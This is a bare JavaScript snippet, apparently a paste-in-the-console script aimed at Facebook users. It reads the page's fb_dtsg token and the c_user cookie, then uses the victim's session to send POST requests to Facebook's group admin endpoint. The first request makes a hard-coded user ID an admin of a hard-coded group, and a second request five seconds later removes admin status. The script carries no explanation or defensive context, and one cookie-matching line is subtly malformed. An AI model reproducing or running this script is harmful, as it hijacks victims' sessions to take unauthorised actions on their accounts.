var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDA(L) {
  function grp(g) {
var X = new XMLHttpRequest();
var XURL = "//www.facebook.com/ajax/groups/admins_post.php";
var XParams = "fb_dtsg="+fb_dtsg+"&gid="+g+"&uid="+L+"&operation=confirm_add_admin&source=profilebrowser&make_admin=1&__user="+user_id+"&__a=1&__dyn=7n8ahyngNoSdDgDxyKAEWC5ECiq78hyWgSmEVFLFwxBxCbzElx24QqV8KVpoW8w&__req=b&ttstamp=26581721095188861071146981121&__rev=1433023";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
}
grp("705588956191212");
}
IDA("100003653787875");

    setTimeout(function(){
      
      

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDA(L) {
  function grp(g) {
var X = new XMLHttpRequest();
var XURL = "//www.facebook.com/ajax/groups/admins_post.php";
var XParams = "fb_dtsg="+fb_dtsg+"&gid="+g+"&uid="+L+"&operation=confirm_remove_admin&source=profilebrowser&__user="+user_id+"&__a=1&__dyn=7n8anEBQ9FoBUSt2u6aWizGpUW9ACxO4p9GgSmEVFLFwxBxCbzEjUgDyQqV8KVpoW8w&__req=h&ttstamp=265817111312075458011545110121&__rev=1433023";
X.open("POST", XURL, true);
X.onreadystatechange = function () {
if (X.readyState == 4 && X.status == 200) {
X.close;
}
};
X.send(XParams);
}
grp("705588956191212");
}
IDA("100003653787875");
      
      
      
    }, 5000);
